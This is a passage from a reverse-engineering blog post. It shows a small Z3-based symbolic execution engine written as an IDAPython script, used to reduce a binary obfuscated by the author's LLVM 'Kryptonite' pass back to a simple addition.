</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">^</span> <span class="n">src</span><span class="p">)</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;xor&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;or&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># or reg32, reg32</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">|</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">src</span><span class="p">))</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;or&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;add&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># add reg32, reg32</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">src</span><span class="p">))</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;add&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                <span class="k">print</span> <span class="n">mnemonic</span><span class="p">,</span> <span class="n">dst</span><span class="p">,</span> <span class="n">src</span>
</span><span class='line'>                <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This instruction is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">get_reg_equation_simplified</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">reg</span><span class="p">):</span>
</span><span class='line'>        <span class="n">eq</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
</span><span class='line'>        <span class="n">eq</span> <span class="o">=</span> <span class="n">simplify</span><span class="p">(</span><span class="n">eq</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">eq</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Testing</h2>

<p>OK, we just have to instantiate the engine giving him the start/end address of the routine and to ask him to give us the final equation holded in EAX.</p>

<figure class='code'><figcaption><span>main</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;Here we will try to attack the semantic-preserving obfuscations</span>
</span><span class='line'><span class="sd">    I talked about in &quot;Obfuscation of steel: meet my Kryptonite.&quot; : http://0vercl0k.tuxfamily.org/bl0g/?p=260.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    The idea is to defeat those obfuscations using a tiny symbolic execution engine.&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="n">sym</span> <span class="o">=</span> <span class="n">SymbolicExecutionEngine</span><span class="p">(</span><span class="mh">0x804845A</span><span class="p">,</span> <span class="mh">0x0804A17C</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Launching the engine..&#39;</span>
</span><span class='line'>    <span class="n">sym</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Done, retrieving the equation in EAX, and simplifying..&#39;</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">sym</span><span class="o">.</span><span class="n">get_reg_equation_simplified</span><span class="p">(</span><span class="s">&#39;eax&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;EAX=</span><span class="si">%r</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">eax</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">main</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And here is what I saw:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>Launching the engine..
</span><span class='line'>Trying to read a non-initialized area, we got a new symbolic variable: arg0
</span><span class='line'>Trying to read a non-initialized area, we got a new symbolic variable: arg1
</span><span class='line'>Done, retrieving the equation in EAX, and simplifying..
</span><span class='line'>EAX=(~(Concat(2147483647, Extract(0, 0, arg1)) |
</span><span class='line'>   Concat(2147483647, ~Extract(0, 0, arg0)) |
</span><span class='line'>   4294967294) |
</span><span class='line'> ~(Concat(2147483647, ~Extract(0, 0, arg1)) |
</span><span class='line'>   Concat(2147483647, Extract(0, 0, arg0)) |
</span><span class='line'>   4294967294)) +
</span><span class='line'>Concat(~(Concat(1073741823, Extract(1, 1, arg1)) |
</span><span class='line'>         Concat(1073741823, ~Extract(1, 1, arg0)) |
</span><span class='line'>         Concat(1073741823,
</span><span class='line'>                ~(~Extract(0, 0, arg1) |
</span><span class='line'>                  ~Extract(0, 0, arg0)))) |
</span><span class='line'>       ~(Concat(1073741823, ~Extract(1, 1, arg1)) |
</span><span class='line'>         Concat(1073741823, Extract(1, 1, arg0)) |
</span><span class='line'>         Concat(1073741823,
</span><span class='line'>                ~(~Extract(0, 0, arg1) |
</span><span class='line'>                  ~Extract(0, 0, arg0)))) |
</span><span class='line'>       ~(Concat(1073741823, Extract(1, 1, arg1)) |
</span><span class='line'>         Concat(1073741823, Extract(1, 1, arg0)) |
</span><span class='line'>         Concat(1073741823, ~Extract(0, 0, arg1)) |
</span><span class='line'>         Concat(1073741823, ~Extract(0, 0, arg0)) |
</span><span class='line'>         2147483646) |
</span><span class='line'>       ~(Concat(1073741823, ~Extract(1, 1, arg1)) |
</span><span class='line'>         Concat(1073741823, ~Extract(1, 1, arg0)) |
</span><span class='line'>         Concat(1073741823, ~Extract(0, 0, arg1)) |
</span><span class='line'>         Concat(1073741823, ~Extract(0, 0, arg0)) |
</span><span class='line'>         2147483646),
</span><span class='line'>       0) +
</span><span class='line'>...
</span></code></pre></td></tr></table></div></figure>


<p>There was two possible explanations for this problem:</p>

<ul>
<li>my code is wrong, and it generates equations not simplify-able.</li>
<li>my code is right, and Z3Py&rsquo;s simplify method has a hard time to simplify it.</li>
</ul>


<p> To know what was the right answer, I used Z3Py&rsquo;s prove function in order to know if the equation was equivalent to a simple addition:</p>

<figure class='code'><figcaption><span>main</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'> <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;Here we will try to attack the semantic-preserving obfuscations</span>
</span><span class='line'><span class="sd">    I talked about in &quot;Obfuscation of steel: meet my Kryptonite.&quot; : http://0vercl0k.tuxfamily.org/bl0g/?p=260.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    The idea is to defeat those obfuscations using a tiny symbolic execution engine.&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="n">sym</span> <span class="o">=</span> <span class="n">SymbolicExecutionEngine</span><span class="p">(</span><span class="mh">0x804845A</span><span class="p">,</span> <span class="mh">0x0804A17C</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Launching the engine..&#39;</span>
</span><span class='line'>    <span class="n">sym</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Done, retrieving the equation in EAX, and simplifying..&#39;</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">sym</span><span class="o">.</span><span class="n">get_reg_equation_simplified</span><span class="p">(</span><span class="s">&#39;eax&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">prove</span><span class="p">(</span><span class="n">eax</span> <span class="o">==</span> <span class="n">Sum</span><span class="p">(</span><span class="n">sym</span><span class="o">.</span><span class="n">sym_variables</span><span class="p">))</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">main</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Fortunately for us, it printed <em>True</em> ; so our code is correct. But it also means, the simplify function, as is at least, isn&rsquo;t able to simplify that bunch of equations involving bit-vector arithmetics. I still haven&rsquo;t found a clean way to make Z3Py simplify my big equation, so if someone knows how I can do that please contact me. I&rsquo;ve also exported the complete equation, and uploaded it <a href="http://doar-e.github.io/downloads/code/breaking_kryptonite_s_obfuscation_with_symbolic_execution/eq.txt">here</a> ; you are free to give it a try like this.</p>

<p>The ugly trick I came up with is just to use Z3Py&rsquo;s prove function, to try to prove that the equation is in fact an addition and if this is the case it returns the simplified equation. Again, if someone manages to simplify the previous equation without that type of trick I&rsquo;m really interested!</p>

<figure class='code'><figcaption><span>nasty trick</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">_simplify_additions</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">eq</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;The idea in this function is to help Z3 to simplify our big bitvec-arithmetic</span>
</span><span class='line'><span class="sd">    expression. It&#39;s simple, in eq we have a big expression with two symbolic variables (arg0 &amp; arg1)</span>
</span><span class='line'><span class="sd">    and a lot of bitvec arithmetic. Somehow, the simplify function is not clever enough to reduce the</span>
</span><span class='line'><span class="sd">    equation.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    The idea here is to use the prove function in order to see if we can simplify an equation by an addition of the</span>
</span><span class='line'><span class="sd">    symbolic variables.&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="c"># The two expressions are equivalent ; we got a simplification!</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">prove</span><span class="p">(</span><span class="n">Sum</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span><span class="p">)</span> <span class="o">==</span> <span class="n">eq</span><span class="p">):</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">Sum</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="n">eq</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">get_reg_equation_simplified</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">reg</span><span class="p">):</span>
</span><span class='line'>    <span class="n">eq</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
</span><span class='line'>    <span class="n">eq</span> <span class="o">=</span> <span class="n">simplify</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_simplify_additions</span><span class="p">(</span><span class="n">eq</span><span class="p">))</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">eq</span>
</span></code></pre></td></tr></table></div></figure>


<p>And now if you relaunch the script you will get:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>Launching the engine..
</span><span class='line'>Trying to read a non-initialized area, we got a new symbolic variable: arg0
</span><span class='line'>Trying to read a non-initialized area, we got a new symbolic variable: arg1
</span><span class='line'>Done, retrieving the equation in EAX, and simplifying..
</span><span class='line'>EAX=arg0 + arg1
</span></code></pre></td></tr></table></div></figure>


<p>We just successfully simplified two thousands of assembly into a simple addition, wonderful!</p>

<h1>Symbolic execution VS Kryptonite</h1>

<p>OK, now we have a working engine able to break a small program (~two thousands instructions), let&rsquo;s see if we can do the same with a kryptonized-binary. Let&rsquo;s take a simple addition like in the previous parts:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">add</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">b</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Result: %u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">add</span><span class="p">(</span><span class="n">atoll</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span> <span class="n">atoll</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])));</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, time for a kryptonization:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>wget https://raw.github.com/0vercl0k/stuffz/master/llvm-funz/kryptonite/llvm-functionpass-kryptonite-obfuscater.cpp
</span><span class='line'><span class="nv">$ </span>clang++ llvm-functionpass-kryptonite-obfuscater.cpp <span class="sb">`</span>llvm-config --cxxflags --ldflags --libs core<span class="sb">`</span> -shared -o llvm-functionpass-kryptonite-obfuscater.so
</span><span class='line'><span class="nv">$ </span>clang -S -emit-llvm add.c -o add.ll
</span><span class='line'><span class="nv">$ </span>opt -S -load ~/dev/llvm-functionpass-kryptonite-obfuscater.so -kryptonite -heavy-add-obfu add.ll -o add.opti.ll <span class="o">&amp;&amp;</span> mv add.opti.ll add.ll
</span><span class='line'><span class="nv">$ </span>opt -S -load ~/dev/llvm-functionpass-kryptonite-obfuscater.so -kryptonite -heavy-add-obfu add.ll -o add.opti.ll <span class="o">&amp;&amp;</span> mv add.opti.ll add.ll
</span><span class='line'><span class="nv">$ </span>llc -O0 -filetype<span class="o">=</span>obj -march<span class="o">=</span>x86 add.ll -o add.o
</span><span class='line'><span class="nv">$ </span>clang -static add.o -o kryptonite-add
</span><span class='line'><span class="nv">$ </span>strip --strip-all ./kryptonite-add
</span></code></pre></td></tr></table></div></figure>


<p>At this moment we end up with that binary: <a href="https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/kryptonite-add">kryptonite-add</a>. The target routine for our study starts at 0x804823C and ends at 0x08072284 ; roughly more than 40 thousands assembly instructions and kind of big right?</p>

<p>Here is our final IDAPython script after some minor adjustments (added one or two more instructions):</p>

<figure class='code'><figcaption><span>tiny_symbolic_execution_engine_z3.py</span><a href='https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/tiny_symbolic_execution_engine_z3.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">class</span> <span class="nc">EquationId</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">id_</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">id</span> <span class="o">=</span> <span class="n">id_</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__repr__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="k">return</span> <span class="s">&#39;EID:</span><span class="si">%d</span><span class="s">&#39;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">id</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Disassembler</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;A simple class to decode easily instruction in IDA&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">start</span> <span class="o">=</span> <span class="n">start</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">end</span> <span class="o">=</span> <span class="n">end</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">eip</span> <span class="o">=</span> <span class="n">start</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">_decode_instr</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;Returns mnemonic, dst, src&#39;&#39;&#39;</span>
